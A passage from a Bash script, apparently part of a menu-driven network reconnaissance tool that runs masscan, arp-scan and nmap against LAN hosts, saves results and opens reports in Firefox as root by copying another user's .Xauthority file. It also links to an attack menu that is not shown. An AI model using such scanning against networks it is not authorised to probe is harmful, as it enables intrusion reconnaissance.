			#gets user to confirm masscan target, ports and rate
			MASSCAN_SETTINGS_CONFIRM
			MASSCAN_TARGET_CHECKER=1
			shift
			;;
			2 )
			#allow user to enter 2 ports
			MASSCAN_PORTS_RANGE
			#allow user to enter masscan rate
			MASSCAN_RATE_SELECT
			#allow user to enter number of retries
			MASSCAN_RETRIES_SELECT
			#gets user to confirm masscan target, ports and rate
			MASSCAN_SETTINGS_CONFIRM
			MASSCAN_TARGET_CHECKER=1
			shift
			;;
			r | R | return | Return | RETURN )
			#presents Masscan Menu to the user
			MASSCAN_MENU
			MASSCAN_TARGET_CHECKER=1
			shift
			;;
			b | B | back | Back | BACK )
			#presents Masscan Menu to the user
			MASSCAN_SELECT_TARGET
			MASSCAN_TARGET_CHECKER=1
			shift
			;;
			q | Q | quit | Quit | QUIT )
			exit
			shift
			;;
			* )
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please try again.\n"
			shift
			;;
		esac
	done
}

#allow user to enter 2 ports
function MASSCAN_PORTS_RANGE {
	#assign varbiale to check if string is numbers
	IS_DIGIT='^[0-9]+$'
	#assign checker variable for while loop
	MASSCAN_PSTART_CHECKER=0
	while [ "$MASSCAN_PSTART_CHECKER" -eq 0 ]
	do
		echo
		echo -e -n "${Yellow}[?]${NC} Please enter the starting port of the ports range: "
		read MASSCAN_PORTS_START
		#validate if $MASSCAN_PORTS_START is empty
		if [ -z "$MASSCAN_PORTS_START" ]; then
			echo -e "\n${Light_Red}[!]${NC} No input captured. Please enter a range between port 0-65535."
		elif [[ "$MASSCAN_PORTS_START" =~ $IS_DIGIT ]] && [ "$MASSCAN_PORTS_START" -lt 65536 ]; then
			MASSCAN_PORTS_START=$(echo $MASSCAN_PORTS_START)
			MASSCAN_PSTART_CHECKER=1
		else
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter a range between port ${Cyan}0-65535${NC}."
		fi
	done
	#assign checker variable for while loop
	MASSCAN_PSTOP_CHECKER=0
	while [ "$MASSCAN_PSTOP_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Please enter the ending port of the ports range: "
		read MASSCAN_PORTS_STOP
		#validate if $MASSCAN_PORTS_STOP is empty
		if [ -z "$MASSCAN_PORTS_STOP" ]; then
			echo -e "\n${Light_Red}[!]${NC} No input captured. Please enter a range between port 0-65535.\n"
		elif [[ "$MASSCAN_PORTS_STOP" =~ $IS_DIGIT ]] && [ "$MASSCAN_PORTS_STOP" -lt 65536 ] && [ "$MASSCAN_PORTS_STOP" -gt $(echo $MASSCAN_PORTS_START) ]; then
			MASSCAN_PORTS_STOP=$(echo $MASSCAN_PORTS_STOP)
			MASSCAN_PSTOP_CHECKER=1
		else
			echo -e "${Light_Red}[!]${NC} Please enter a range between port ${Cyan}0-65535${NC} and greater than ${Cyan}$(echo $MASSCAN_PORTS_START)${NC}.\n"
		fi
	done
	#assign the selected range to variable $MASSCAN_PORTS
	MASSCAN_PORTS="$(echo $MASSCAN_PORTS_START)-$(echo $MASSCAN_PORTS_STOP)"
}

#allow user to enter masscan rate
function MASSCAN_RATE_SELECT {
	#assign varbiale to check if string is numbers
	IS_DIGIT='^[0-9]+$'
	#assign checker variable for while loop
	MASSCAN_RATE_CHECKER=0
	while [ "$MASSCAN_RATE_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Please enter the rate: "
		read MASSCAN_RATE
		#validate if $MASSCAN_RATE is empty
		if [ -z "$MASSCAN_RATE" ]; then
			echo -e "\n${Light_Red}[!]${NC} No input captured. Please enter try again.\n"
		elif [[ "$MASSCAN_RATE" =~ $IS_DIGIT ]]; then
			MASSCAN_RATE=$(echo $MASSCAN_RATE)
			MASSCAN_RATE_CHECKER=1
		else
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please try again.\n"
		fi
	done
}

#allow user to enter number of retries
function MASSCAN_RETRIES_SELECT {
	#assign varbiale to check if string is numbers
	IS_DIGIT='^[0-9]+$'
	#assign checker variable for while loop
	MASSCAN_RETRIES_CHECKER=0
	while [ "$MASSCAN_RETRIES_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Please enter the number of retries: "
		read MASSCAN_RETRIES
		#validate if $MASSCAN_RETRIES is empty
		if [ -z "$MASSCAN_RETRIES" ]; then
			echo -e "\n${Light_Red}[!]${NC} No input captured. Please enter try again.\n"
		elif [[ "$MASSCAN_RETRIES" =~ $IS_DIGIT ]]; then
			MASSCAN_RETRIES=$(echo $MASSCAN_RETRIES)
			MASSCAN_RETRIES_CHECKER=1
		else
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please try again.\n"
		fi
	done
}

#gets user to confirm masscan target, ports and rate
function MASSCAN_SETTINGS_CONFIRM {
	#assign checker variable for while loop
	MASSCAN_SCONFIRM_CHECKER=0
	while [ "$MASSCAN_SCONFIRM_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Confirm using ${Light_Purple}masscan${NC} ${Green}$(echo $MASSCAN_TARGET)${NC} ${Light_Purple}-p${NC}${Cyan}$(echo $MASSCAN_PORTS)${NC} ${Light_Purple}--rate${NC} ${Cyan}$(echo $MASSCAN_RATE)${NC} ${Light_Purple}--retries=${NC}${Cyan}$(echo $MASSCAN_RETRIES)${NC} (y/n)? "
		read MS_SETTINGS_CONFIRM
		case $MS_SETTINGS_CONFIRM in
			y | Y | yes | Yes | YES)
			#execute masscan on selected target
			MASSCAN_RUN
			#presents Masscan Menu to the user
			MASSCAN_MENU
			MASSCAN_SCONFIRM_CHECKER=1
			shift
			;;
			n | N | no | No | NO)
			#presents Masscan Menu to the user
			MASSCAN_MENU
			MASSCAN_SCONFIRM_CHECKER=1
			shift
			;;
			*)
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter '${Orange}y${NC}' or '${Orange}n${NC}'."
			shift
			;;
		esac
	done
}

#execute masscan on selected target
function MASSCAN_RUN {
	#assign $MASSCAN_TARGET mac address
	MASSCAN_TARGETIP_MAC=$(arp-scan $MASSCAN_TARGET | grep $(echo $MASSCAN_TARGET) | awk '{print $1, $2}')
	#assign variable for date + time
	DATE_TIME=$(date -u +"D%FT%H:%M:%SZ")
	#assign masscan output filename
	MASSCAN_FILENAME=$MASSCAN_TARGET"-"$DATE_TIME"-masscan.xml"
	MASSCAN_PORTS_FNAME=$MASSCAN_TARGET"-"$DATE_TIME"-masscan.ports"
	echo -e "\n${Light_Purple}[-]${NC} Executing Masscan scanning. Please be patient..."
	#assign session time to variable
	DATETIME_UTC_SESSION=$(date -u +"%F %H:%M:%S")
	echo -e "\n${White}Event Date/Time: $(echo $DATETIME_UTC_SESSION) UTC${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo
	#access $MASSCAN_DIR_PATH to store files generated by the script
	cd $MASSCAN_DIR_PATH
	#execute masscan and save the output
	masscan $(echo $MASSCAN_TARGET) -p$(echo $MASSCAN_PORTS) --rate $(echo $MASSCAN_RATE) --retries=$(echo $MASSCAN_RETRIES) --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl -oX $MASSCAN_FILENAME
	echo -e "${Light_Purple}masscan${NC} ${Green}$(echo $MASSCAN_TARGET)${NC} ${Light_Purple}-p${NC}${Cyan}$(echo $MASSCAN_PORTS)${NC} ${Light_Purple}--rate${NC} ${Cyan}$(echo $MASSCAN_RATE)${NC} ${Light_Purple}--retries=${NC}${Cyan}$(echo $MASSCAN_RETRIES)${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	#validate if $MASSCAN_FILENAME file exists
	if [ -f "$MASSCAN_FILENAME" ]; then
		#validate if filesize is not greater than zero
		if [ ! -s "$MASSCAN_FILENAME" ]; then
			echo -e "${Light_Red}[!]${NC} No Masscan scan results. Please choose another target." | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			#presents Masscan Menu to the user
			MASSCAN_MENU
		else
			#save $MASSCAN_TARGETIP_MAC into $MASSCAN_PORTS_FNAME
			echo "#$(echo $MASSCAN_TARGETIP_MAC)" > $MASSCAN_PORTS_FNAME
			#assign counter variable
			OPEN_PORTS_COUNTER=1
			echo
			echo -e "${White}[*] Open Ports:${NC} ${Green}$(echo $MASSCAN_TARGET)${NC}" | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			#output $MASSCAN_FILENAME to user
			while read open_ports
			do
				#grep open ports
				MASSCAN_OPEN_PORTS=$(echo $open_ports| grep portid | awk -F '><' '{print $4}' | awk -F '"' '{print $(NF-1)}')
				#validate if $MASSCAN_OPEN_PORTS is empty
				if [ ! -z "$MASSCAN_OPEN_PORTS" ]; then
					#output ip addresses that are not the same as the default gateway
					echo -e "[$(echo $OPEN_PORTS_COUNTER)] $(echo $MASSCAN_OPEN_PORTS)" | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME
					#append open ports into $MASSCAN_PORTS_FNAME
					echo -e "$(echo $MASSCAN_OPEN_PORTS)" >> $MASSCAN_PORTS_FNAME 
					let OPEN_PORTS_COUNTER+=1
				fi
			done < $MASSCAN_FILENAME
			#execute firefox in root. takes in 1 argument
			FIREFOX_RUN $MASSCAN_DIR_PATH/$MASSCAN_FILENAME
			#display the path of saved files to the user
			echo -e "File Saved: $(echo $MASSCAN_DIR_PATH)/$(echo $MASSCAN_FILENAME)" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			echo -e "File Saved: $(echo $MASSCAN_DIR_PATH)/$(echo $MASSCAN_PORTS_FNAME)" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
		fi
	else
		echo -e "${Light_Red}[!]${NC} $MASSCAN_FILENAME file does not exist. Please run $0 again."
		exit
	fi
}

#allows user to choose if he/she wants to use the previously saved data
function MASSCAN_HISTORY {
	#validate if user selected single target scan
	if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
		#assign single $LAN_IP_TARGET to $MASSCAN_TARGET
		MASSCAN_TARGET=$LAN_IP_TARGET
	fi
	#validate if user selected network scan
	if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
		#assign network scan IP to $MASSCAN_TARGET
		MASSCAN_TARGET=$MASSCAN_TARGET
	fi
	#assign $MASSCAN_TARGET mac address
	MASSCAN_TARGETIP_MAC=$(arp-scan $MASSCAN_TARGET | egrep ^$(echo $MASSCAN_TARGET) | awk '{print $2}')
	#access $MASSCAN_DIR_PATH
	cd $MASSCAN_DIR_PATH
	#list the file with the most scanned results that matches with the string $MASSCAN_TARGET
	MASSCAN_RECORD=$(ls -lSh | grep $(echo $MASSCAN_TARGET) | egrep '\.ports$' | awk '{if ($5 != 0) print $9}' | head -n 1)
	MASSCAN_RECORD_FNAME=$(ls -lSh | grep $(echo $MASSCAN_TARGET) | egrep '\.ports$' | awk '{if ($5 != 0) print $9}' | head -n 1 | sed 's/'.ports'//')
	#validate if $MASSCAN_RECORD_FNAME is not empty
	if [ ! -z "$MASSCAN_RECORD_FNAME" ]; then
		MASSCAN_XML=$(ls -lSh | grep $(echo $MASSCAN_RECORD_FNAME) | egrep '\.xml$' | awk '{if ($5 != 0) print $9}' | head -n 1)
	fi
	#validate if default gatewawwy mac address is inside saved record
	if [ ! -z "$MASSCAN_RECORD" ]; then
		MSTARGETIP_MAC_EXIST=$(grep $MASSCAN_TARGETIP_MAC $MASSCAN_RECORD)
	fi
	#validate if $MASSCAN_RECORD and $MSTARGETIP_MAC_EXIST are not empty
	if [ ! -z "$MASSCAN_RECORD" ] && [ ! -z "$MSTARGETIP_MAC_EXIST" ]; then 
		echo
		echo -e "${Light_Purple}-------------------------------${NC}"
		echo -e "${White}PREVIOUSLY ${Light_Cyan}MASSCAN${NC} SAVED RECORD${NC}"
		echo -e "${Light_Purple}-------------------------------${NC}"
		echo -e "${Light_Purple}[*]${NC} File Name: $(echo $MASSCAN_RECORD)"
		echo -e "${Light_Purple}[*]${NC} Date/Time: $(echo $MASSCAN_RECORD | awk -F 'D' '{print $2}' | awk -F 'T' '{print $1}') $(echo $MASSCAN_RECORD | awk -F 'T' '{print $2}' | awk -F 'Z' '{print $1}')UTC"
		echo -e "${Light_Purple}[${Orange}V${NC}${Light_Purple}]${NC} ${Orange}V${NC}iew Previously Saved Record With The Most Scanned Results"
		echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn To Main Menu"
		echo -e "${Light_Purple}[${Orange}B${NC}${Light_Purple}]${NC} ${Orange}B${NC}ack To Previous Options"
		echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
		echo -e "${Light_Purple}-------------------------------${NC}"
		#assign checker variable for while loop
		MASSCAN_RECORD_CHECKER=0
		while [ "$MASSCAN_RECORD_CHECKER" -eq 0 ]
		do
			echo -e -n "${Yellow}[?]${NC} Perform new scan for ${Green}$(echo $MASSCAN_TARGET)${NC} (y/n)? "
			read MASSCAN_RECORD_CONFIRM
			case $MASSCAN_RECORD_CONFIRM in
				v | V | view | View | VIEW)
				#validate if $RECORD_OUTPUT file exists and output it to user, take in 1 argument $1
				MASSCAN_RECORD_OUTPUT $MASSCAN_RECORD
				#validate if $MASSCAN_XML file exists
				if [ -f "$MASSCAN_DIR_PATH/$MASSCAN_XML" ]; then
					#execute firefox in root. takes in 1 argument
					FIREFOX_RUN $MASSCAN_DIR_PATH/$MASSCAN_XML
				else
					echo -e "${Light_Red}[!]${NC} Unable to locate $MASSCAN_XML."
				fi
				#presents Masscan Menu to the user
				MASSCAN_MENU
				MASSCAN_RECORD_CHECKER=1
				shift
				;;
				y | Y | yes | Yes | YES)
				#allow user to choose masscan port range
				MASSCAN_SELECT_PORTS
				MASSCAN_RECORD_CHECKER=1
				shift
				;;
				n | N | no | No | NO)
				#presents Masscan Menu to the user
				MASSCAN_MENU
				MASSCAN_RECORD_CHECKER=1
				shift
				;;
				r | R | return | Return | RETURN) 
				#reset checker variables to 0 before returning to the main menu
				SINGLE_TARGET_CHECKER=0
				NETWORK_TARGET_CHECKER=0
				#presents to user the main menu to choose a single target or to scan for a local area network
				MAIN_MENU
				MASSCAN_RECORD_CHECKER=1
				shift
				;;
				b | B | back | Back | BACK) 
				#list out the arp ip address for the user to select the target
				MASSCAN_SELECT_TARGET
				MASSCAN_RECORD_CHECKER=1
				shift
				;;
				q | Q | quit | Quit | QUIT)
				exit
				shift
				;;
				*)
				echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter '${Orange}y${NC}', '${Orange}n${NC}', '${Orange}V${NC}', '${Orange}R${NC}', '${Orange}B${NC}' or '${Orange}Q${NC}'."
				shift
				;;
			esac 
		done
	else
		MASSCAN_RECORD_CHECKER=2
	fi
}

#validate if $MASSCAN_RECORD_OUTPUT file exists and output it to user, take in 1 argument $1
function MASSCAN_RECORD_OUTPUT {
	OUTPUT_FILENAME=$1
	#validates is $OUTPUT_FILENAME file exists
	if [ -f "$OUTPUT_FILENAME" ]; then
		#validate if filesize is not greater than zero
		if [ ! -s "$OUTPUT_FILENAME" ]; then
			echo -e "${Light_Red}[!]${NC} No ports detected. Please choose another target."
			#presents Masscan Menu to the user
			MASSCAN_MENU
		else
			#assign counter variable
			OUTPUT_COUNTER=1
			echo -e "\n${White}[*]${NC} Open port(s) for ${Green}$(echo $MASSCAN_TARGET)${NC}:"
			#output $OUTPUT_FILENAME to user
			while read output_ip
			do
				#output ip addresses that are not the same as the default gateway
				if [[ "$(echo $output_ip | awk -F ' ' '{print $1}')" != "#$(echo $MASSCAN_TARGET)" ]] && [[ ! "$(echo $output_ip)" =~ "#" ]]; then
					echo -e "[$(echo $OUTPUT_COUNTER)] $(echo $output_ip | awk -F ' ' '{print $1}')"
					let OUTPUT_COUNTER+=1
				fi
			done < $OUTPUT_FILENAME
		fi
	else
		echo -e "${Light_Red}[!]${NC} $OUTPUT_FILENAME file does not exist. Please run $0 again."
		exit
	fi
}

#disallow root to execute firefox
function XAUTHORITY_REMOVE {
	cd /root 2> /dev/null
	#validate if $XAUTH_RESULT is not empty
	if [ ! -z "$XAUTH_RESULT" ]; then
		test -f .Xauthority.bak && mv .Xauthority.bak .Xauthority
	fi
	#validate if $XAUTH_RESULT is empty
	if [ -z "$XAUTH_RESULT" ]; then
		#validate if file exists
		if [ -f ".Xauthority" ]; then
			rm .Xauthority
		fi
	fi
}


#execute firefox in root. takes in 1 argument
function FIREFOX_RUN {
	cd /root
	updatedb
	XAUTHORITY_PATH=$(locate .Xauthority | head -n 1)
	#validate if $XAUTH_RESULT is empty
	if [ -z "$XAUTH_RESULT" ]; then
		cp -a $XAUTHORITY_PATH .Xauthority
		chown root: .Xauthority
	else
		mv .Xauthority .Xauthority.bak
		cp -a $XAUTHORITY_PATH .Xauthority
		chown root: .Xauthority
	fi
	#execute firefox in root
	XAUTHORITY=/root/.Xauthority sudo firefox $1 &
}

#presents Nmap Menu to the user
function NMAP_MENU {
	echo
	echo -e "${Light_Purple}------------${NC}"
	echo -e "${White}${Light_Cyan}NMAP${NC} ${White}MENU${NC}"
	echo -e "${Light_Purple}------------${NC}"
	echo -e "${Light_Purple}[${Orange}S${NC}${Light_Purple}]${NC} ${Orange}S${NC}elect Target"
	echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn To Main Menu"
	echo -e "${Light_Purple}[${Orange}G${NC}${Light_Purple}]${NC} ${Orange}G${NC}o To Scanning/Attack Menu"
	echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
	echo -e "${Light_Purple}------------${NC}"
	#assign checker variable for while loop
	NMAP_MENU_CHECKER=0
	while [ "$NMAP_MENU_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Please select '${Orange}S${NC}', '${Orange}R${NC}', '${Orange}B${NC}' or '${Orange}Q${NC}': "
		read NMAP_MENU_CHOICE
		case $NMAP_MENU_CHOICE in
			s | S | select | Select | SELECT)
			#validate if user selected single target scan
			if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
				#assign $NMAP_STATUS value to 1
				NMAP_STATUS=1
				#get user input for the LAN IP address to inspect
				LAN_IP_MENU
			fi
			#validate if user selected network scan
			if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
				#assign $NMAP_STATUS value to 1
				NMAP_STATUS=1
				#list out the arp ip address for the user to select the target
				NMAP_SELECT_TARGET
			fi
			NMAP_MENU_CHECKER=1
			shift
			;;
			r | R | return | Return | RETURN)
			#reset checker variables to 0 before returning to the main menu
			SINGLE_TARGET_CHECKER=0
			NETWORK_TARGET_CHECKER=0
			#presents to user the main menu to choose a single target or to scan for a local area network
			MAIN_MENU
			NMAP_MENU_CHECKER=1
			shift
			;;
			g | G | go | Go | GO)
			#present the scan/attack menu to the user
			ATTACK_MENU
			NMAP_MENU_CHECKER=1
			shift
			;;
			q | Q | quit | Quit | QUIT)
			exit
			shift
			;;
			* )
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please try again.\n"
			shift 
			;;
		esac
	done
}

#list out the arp ip address for the user to select the target
function NMAP_SELECT_TARGET {
	NMAP_TARGET_OPTIONS_CHECKER=0
	#change directory to $ARP_DIR_PATH
	cd $ARP_DIR_PATH
	#validate if $ARP_FILENAME file exists
	if [ -f "$ARP_FILENAME" ]; then
		echo -e "\n${White}[*] Host(s) Detected:${NC}"
		#output $ARP_FILENAME list of IP addresses to user
		while read arp_list
		do
			#output ip addresses that are not the same as the default gateway
			if [ "$(echo $arp_list | awk -F ' ' '{print $1}')" != "$DEFAULT_GATEWAY" ]; then
				echo -e "${Light_Purple}[*]${NC} ${Green}$(echo $arp_list | awk -F ' ' '{print $1}')${NC}"
			fi
		done < $ARP_FILENAME
		echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn To Main Menu"
		echo -e "${Light_Purple}[${Orange}B${NC}${Light_Purple}]${NC} ${Orange}B${NC}ack To Nmap Menu"
		echo -e "${Light_Purple}[${Orange}G${NC}${Light_Purple}]${NC} ${Orange}G${NC}o To Scanning/Attack Menu"
		echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
		NMAP_TARGET_CHECKER=0
		while [ "$NMAP_TARGET_CHECKER" -eq 0 ]
		do
			echo -e -n "${Yellow}[?]${NC} Enter your target: "
			read NMAP_TARGET
			#validate if $NMAP_TARGET is empty
			if [ -z "$NMAP_TARGET" ]; then
				echo -e "\n${Light_Red}[!]${NC} No input captured. Please try again.\n"
			else
				#validate if $NMAP_TARGET exist in $ARP_FILENAME empty
				if [ ! -z "$(cat $ARP_FILENAME | awk '{print $1}' | grep -Fx $NMAP_TARGET)" ]; then
					NMAP_TARGET_OPTIONS_CHECKER=1
					#allows user to choose if he/she wants to import masscan saved data
					NMAP_IMPORT_MASSCAN_HISTORY
					NMAP_TARGET_CHECKER=1
				elif [ "$NMAP_TARGET" == "R" ] || [ "$NMAP_TARGET" == "r" ] || [ "$NMAP_TARGET" == "return" ] || [ "$NMAP_TARGET" == "Return" ] || [ "$NMAP_TARGET" == "RETURN" ]; then
					#resets $NMAP_TARGET
					NMAP_TARGET=''
					#reset checker variables to 0 before returning to the main menu
					SINGLE_TARGET_CHECKER=0
					NETWORK_TARGET_CHECKER=0
					#presents to user the main menu to choose a single target or to scan for a local area network
					MAIN_MENU
					NMAP_TARGET_CHECKER=1
				elif [ "$NMAP_TARGET" == "B" ] || [ "$NMAP_TARGET" == "b" ] || [ "$NMAP_TARGET" == "back" ] || [ "$NMAP_TARGET" == "Back" ] || [ "$NMAP_TARGET" == "BACK" ]; then
					#resets $NMAP_TARGET
					NMAP_TARGET=''
					#presents Nmap Menu to the user
					NMAP_MENU
					NMAP_TARGET_CHECKER=1
				elif [ "$NMAP_TARGET" == "Q" ] || [ "$NMAP_TARGET" == "q" ] || [ "$NMAP_TARGET" == "quit" ] || [ "$NMAP_TARGET" == "Quit" ] || [ "$NMAP_TARGET" == "QUIT" ]; then
					exit
					NMAP_TARGET_CHECKER=1
				elif [ "$NMAP_TARGET" == "g" ] || [ "$NMAP_TARGET" == "G" ] || [ "$NMAP_TARGET" == "go" ] || [ "$NMAP_TARGET" == "Go" ] || [ "$NMAP_TARGET" == "GO" ]; then
					#resets $NMAP_TARGET
					NMAP_TARGET=''
					ATTACK_MENU
				else
					echo -e "${Light_Red}[!]${NC} Please choose the target only from the list. Enter '${Orange}R${NC}'eturn, '${Orange}B${NC}'ack or '${Orange}Q${NC}'uit.\n"
				fi
			fi	
		done
	else
		#validate if user selected single target scan
		if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
			#get user input for the LAN IP address to inspect
			LAN_IP_MENU
		fi
			echo -e "${Light_Red}[!]${NC} $ARP_FILENAME file does not exist. Please run $0 again."
		exit
	fi
}

#allows user to choose if he/she wants to import masscan saved data
function NMAP_IMPORT_MASSCAN_HISTORY {
	#validate if user selected single target scan
	if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
		#assign single $LAN_IP_TARGET to $MASSCAN_TARGET
		MASSCAN_TARGET=$LAN_IP_TARGET
	fi
	#validate if user selected network scan
	if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
		#assign Network $NMAP_TARGET to $MASSCAN_TARGET
		MASSCAN_TARGET=$NMAP_TARGET
	fi
	#assign $MASSCAN_TARGET mac address
	MASSCAN_TARGETIP_MAC=$(arp-scan $MASSCAN_TARGET | egrep ^$(echo $MASSCAN_TARGET) | awk '{print $2}')
	#access $MASSCAN_DIR_PATH
	cd $MASSCAN_DIR_PATH
	#list the file with the most scanned results that matches with the string $MASSCAN_TARGET
	MASSCAN_RECORD=$(ls -lSh | grep $(echo $MASSCAN_TARGET) | egrep '\.ports$' | awk '{if ($5 != 0) print $9}' | head -n 1)
	MASSCAN_RECORD_FNAME=$(ls -lSh | grep $(echo $MASSCAN_TARGET) | egrep '\.ports$' | awk '{if ($5 != 0) print $9}' | head -n 1 | sed 's/'.ports'//')
	#validate if $MASSCAN_RECORD_FNAME is not empty
	if [ ! -z "$MASSCAN_RECORD_FNAME" ]; then
		MASSCAN_XML=$(ls -lSh | grep $(echo $MASSCAN_RECORD_FNAME) | egrep '\.xml$' | awk '{if ($5 != 0) print $9}' | head -n 1)
	fi
	#validate if default gatewawwy mac address is inside saved record
	if [ ! -z "$MASSCAN_RECORD" ]; then
		MSTARGETIP_MAC_EXIST=$(grep $MASSCAN_TARGETIP_MAC $MASSCAN_RECORD)
	fi
	#validate if $MASSCAN_RECORD and $MSTARGETIP_MAC_EXIST are not empty
	if [ ! -z "$MASSCAN_RECORD" ] && [ ! -z "$MSTARGETIP_MAC_EXIST" ]; then 
		echo
		echo -e "${Light_Purple}-----------------------------------------------------------${NC}"
		echo -e "${White}PREVIOUS${NC} ${Light_Cyan}MASSCAN${NC} ${White}SAVED RECORD WITH THE MOST SCANNED RESULTS${NC}"
		echo -e "${Light_Purple}-----------------------------------------------------------${NC}"
		echo -e "${Light_Purple}[*]${NC} File Name: $(echo $MASSCAN_RECORD)"
		echo -e "${Light_Purple}[*]${NC} Date/Time: $(echo $MASSCAN_RECORD | awk -F 'D' '{print $2}' | awk -F 'T' '{print $1}') $(echo $MASSCAN_RECORD | awk -F 'T' '{print $2}' | awk -F 'Z' '{print $1}')UTC"
		#validate if $MASSCAN_RECORD_OUTPUT file exists and output it to user, take in 1 argument $1
		MASSCAN_RECORD_OUTPUT $MASSCAN_RECORD
		#allows user to choose if he/she wants to import nmap saved data
		NMAP_HISTORY_PROMPT
		echo -e "\n${Light_Purple}-----------------------------------------------------------${NC}"
		echo -e "${Light_Cyan}NMAP${NC} ${White}MENU OPTIONS${NC}"
		echo -e "${Light_Purple}-----------------------------------------------------------${NC}"
		echo -e "${Light_Purple}[${Orange}1${NC}${Light_Purple}]${NC} Import ${Cyan}Masscan${NC} Scanned Open Port(s) for ${Green}$(echo $MASSCAN_TARGET)${NC}"
		echo -e "${Light_Purple}[${Orange}2${NC}${Light_Purple}]${NC} View Previously Saved ${Cyan}Nmap${NC} Record With The Most Scanned Results"
		echo -e "${Light_Purple}[${Orange}3${NC}${Light_Purple}]${NC} Perform A New Nmap Scan"
		echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn To Main Menu"
		echo -e "${Light_Purple}[${Orange}B${NC}${Light_Purple}]${NC} ${Orange}B${NC}ack To Previous Options"
		echo -e "${Light_Purple}[${Orange}G${NC}${Light_Purple}]${NC} ${Orange}G${NC}o To Scanning/Attack Menu"
		echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
		echo -e "${Light_Purple}-----------------------------------------------------------${NC}"
		#assign checker variable for while loop
		MASSCAN_RECORD_CHECKER=0
		while [ "$MASSCAN_RECORD_CHECKER" -eq 0 ]
		do
			echo -e -n "${Yellow}[?]${NC} Enter '${Orange}1${NC}', '${Orange}2${NC}', '${Orange}3${NC}', '${Orange}R${NC}', '${Orange}B${NC}', '${Orange}G${NC}' or '${Orange}Q${NC}': "
			read MASSCAN_RECORD_CONFIRM
			case $MASSCAN_RECORD_CONFIRM in
				1 )
				#validate if file exists and convert it to a string for nmap ports, take in 1 argument $1
				NMAP_MASSCAN_PORTS $MASSCAN_DIR_PATH/$MASSCAN_RECORD #NMAP_PORTS_IMPORTED_CHECKER=1
				#gets user to confirm nmap settings
				NMAP_SETTINGS_CONFIRM
				MASSCAN_RECORD_CHECKER=1
				shift
				;;
				2 )
				#reset $NMAP_PORTS_IMPORTED_CHECKER
				NMAP_PORTS_IMPORTED_CHECKER=0
				#display $NMAP_DIR_PATH/$NMAP_RECORD to user
				#access $NMAP_DIR_PATH
				cd $NMAP_DIR_PATH
				#list the file with the most scanned results that matches with the string $MASSCAN_TARGET
				NMAP_RECORD=$(ls -lSh | grep $(echo $MASSCAN_TARGET) | egrep '\.nmap$' | awk '{if ($5 != 0) print $9}' | head -n 1)
				NMAP_RECORD_FNAME=$(ls -lSh | grep $(echo $MASSCAN_TARGET) | egrep '\.nmap$' | awk '{if ($5 != 0) print $9}' | head -n 1 | sed 's/'.nmap'//')
				#validate if the file $NMAP_RECORD exists
				if [ ! -z "$NMAP_RECORD" ]; then
					echo
					cat $NMAP_DIR_PATH/$NMAP_RECORD
					#convert $NMAP_RECORD_FNAME.xml to $NMAP_RECORD_FNAME.html
					xsltproc -o $NMAP_DIR_PATH/$NMAP_RECORD_FNAME.html $NMAP_DIR_PATH/$NMAP_RECORD_FNAME.xml
					#execute firefox in root. takes in 1 argument
					FIREFOX_RUN $NMAP_DIR_PATH/$NMAP_RECORD_FNAME.html 
				else
					echo
					echo -e "${Light_Red}[!]${NC} No Previous Nmap Scanned Data for ${Green}$(echo $MASSCAN_TARGET)${NC}.\n"
				fi
				MASSCAN_RECORD_CHECKER=1
				shift
				;;
				3 )
				#reset $NMAP_PORTS_IMPORTED_CHECKER
				NMAP_PORTS_IMPORTED_CHECKER=0
				MASSCAN_RECORD_CHECKER=1
				shift
				;;
				r | R | return | Return | RETURN) 
				#reset checker variables to 0 before returning to the main menu
				SINGLE_TARGET_CHECKER=0
				NETWORK_TARGET_CHECKER=0
				#presents to user the main menu to choose a single target or to scan for a local area network
				MAIN_MENU
				MASSCAN_RECORD_CHECKER=1
				shift
				;;
				b | B | back | Back | BACK) 
				#list out the arp ip address for the user to select the target
				NMAP_SELECT_TARGET
				MASSCAN_RECORD_CHECKER=1
				shift
				;;
				g | G | go | Go | GO) 
				#present the scan/attack menu to the user
				ATTACK_MENU
				MASSCAN_RECORD_CHECKER=1
				shift
				;;
